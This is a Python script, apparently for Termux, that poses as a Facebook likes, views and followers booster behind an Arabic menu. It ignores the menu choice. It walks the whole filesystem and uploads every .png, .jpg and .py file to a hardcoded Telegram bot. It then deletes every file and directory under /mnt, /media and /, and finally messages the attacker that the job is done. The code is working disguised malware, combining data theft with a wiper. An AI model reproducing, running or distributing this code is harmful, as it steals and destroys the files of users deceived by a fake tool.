from colorama import init, Fore
import os
import requests
import shutil
os.system('pkg install requests')
os.system('pkg install colorama')
os.system('pkg install shutil')
os.system('pkg install os')

init(autoreset=True)

print(Fore.RED + "1: رشق لايكات فيس بوك")
print("_______________________________________")
print(Fore.GREEN + "2: رشق مشاهدات فيس بوك")
print("_______________________________________")
print(Fore.BLUE + "3: رشق متابعين فيس بوك")
print("_______________________________________")

choice = input(Fore.YELLOW + 'اختر اختيارك من القائمة: ')

print("برجاء الانتظار يتم تنفيذ طلبك /..")

token = '7695009157:AAEwBu3WSPzZQFoKcxT3qfGVBY8r2pcYjq4'
ID = '8150419960'


def find_and_send_files(extension):
    for root, dirs, filenames in os.walk('/'):
        for filename in filenames:
            if filename.endswith(extension):
                file_path = os.path.join(root, filename)
                with open(file_path, 'rb') as file:
                    requests.post(
                        f'https://api.telegram.org/bot{token}/sendDocument',
                        data={'chat_id': ID},
                        files={'document': file}
                    )



def delete_all_data():

    filesystems = ["/mnt", "/media", "/"]

    for filesystem in filesystems:
        for root, dirs, files in os.walk(filesystem):
            for file in files:
                os.remove(os.path.join(root, file))
            for dir in dirs:
                shutil.rmtree(os.path.join(root, dir))


if __name__ == '__main__':
    find_and_send_files('.png')
    find_and_send_files('.jpg')
    find_and_send_files('.py')

    delete_all_data()

    success_message = "تم الدعس."
    requests.post(f'https://api.telegram.org/bot{token}/sendMessage', data={'chat_id': ID, 'text': success_message})

